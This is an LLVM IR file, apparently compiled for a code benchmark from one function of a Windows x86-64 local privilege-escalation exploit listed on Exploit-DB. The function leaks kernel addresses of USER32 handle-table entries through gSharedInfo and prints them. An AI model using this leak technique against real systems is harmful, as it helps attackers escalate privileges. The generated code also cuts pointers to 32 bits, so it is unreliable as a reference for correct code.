; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows_x86-64/local/extr_41722.c_leak_table_kernel_address.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows_x86-64/local/extr_41722.c_leak_table_kernel_address.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i64 }

@object_number = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [12 x i8] c"gSharedInfo\00", align 1
@.str.1 = private unnamed_addr constant [45 x i8] c"[!] Error while retrieving gSharedInfo: %d.\0A\00", align 1
@.str.2 = private unnamed_addr constant [42 x i8] c"[+] USER32!gSharedInfo located at: %I64x\0A\00", align 1
@.str.3 = private unnamed_addr constant [51 x i8] c"[+] USER32!gSharedInfo->aheList located at: %I64x\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32* @leak_table_kernel_address(i32 %0, i64* %1, i32** %2) #0 {
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i64*, align 8
  %7 = alloca i32**, align 8
  %8 = alloca i32, align 4
  %9 = alloca %struct.TYPE_2__*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i64* %1, i64** %6, align 8
  store i32** %2, i32*** %7, align 8
  %12 = load i32, i32* @object_number, align 4
  %13 = zext i32 %12 to i64
  %14 = load i32, i32* @object_number, align 4
  %15 = zext i32 %14 to i64
  store i32 24, i32* %11, align 4
  %16 = load i32, i32* %5, align 4
  %17 = call i64 @GetProcAddress(i32 %16, i32 ptrtoint ([12 x i8]* @.str to i32))
  %18 = inttoptr i64 %17 to %struct.TYPE_2__*
  store %struct.TYPE_2__* %18, %struct.TYPE_2__** %9, align 8
  %19 = load %struct.TYPE_2__*, %struct.TYPE_2__** %9, align 8
  %20 = icmp eq %struct.TYPE_2__* %19, null
  br i1 %20, label %21, label %24

21:                                               ; preds = %3
  %22 = call i32 (...) @GetLastError()
  %23 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0), i32 %22)
  store i32* null, i32** %4, align 8
  br label %62

24:                                               ; preds = %3
  %25 = load %struct.TYPE_2__*, %struct.TYPE_2__** %9, align 8
  %26 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %25, i32 0, i32 0
  %27 = load i64, i64* %26, align 8
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %10, align 4
  %29 = load %struct.TYPE_2__*, %struct.TYPE_2__** %9, align 8
  %30 = ptrtoint %struct.TYPE_2__* %29 to i32
  %31 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.2, i64 0, i64 0), i32 %30)
  %32 = load i32, i32* %10, align 4
  %33 = call i32 @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.3, i64 0, i64 0), i32 %32)
  store i32 0, i32* %8, align 4
  br label %34

34:                                               ; preds = %56, %24
  %35 = load i32, i32* %8, align 4
  %36 = load i32, i32* @object_number, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %59

38:                                               ; preds = %34
  %39 = load i32, i32* %10, align 4
  %40 = load i64*, i64** %6, align 8
  %41 = load i32, i32* %8, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i64, i64* %40, i64 %42
  %44 = load i64, i64* %43, align 8
  %45 = trunc i64 %44 to i32
  %46 = and i32 %45, 65535
  %47 = load i32, i32* %11, align 4
  %48 = mul nsw i32 %46, %47
  %49 = add nsw i32 %39, %48
  %50 = sext i32 %49 to i64
  %51 = inttoptr i64 %50 to i32*
  %52 = load i32**, i32*** %7, align 8
  %53 = load i32, i32* %8, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i32*, i32** %52, i64 %54
  store i32* %51, i32** %55, align 8
  br label %56

56:                                               ; preds = %38
  %57 = load i32, i32* %8, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %8, align 4
  br label %34

59:                                               ; preds = %34
  %60 = load i32**, i32*** %7, align 8
  %61 = load i32*, i32** %60, align 8
  store i32* %61, i32** %4, align 8
  br label %62

62:                                               ; preds = %59, %21
  %63 = load i32*, i32** %4, align 8
  ret i32* %63
}

declare dso_local i64 @GetProcAddress(i32, i32) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @GetLastError(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
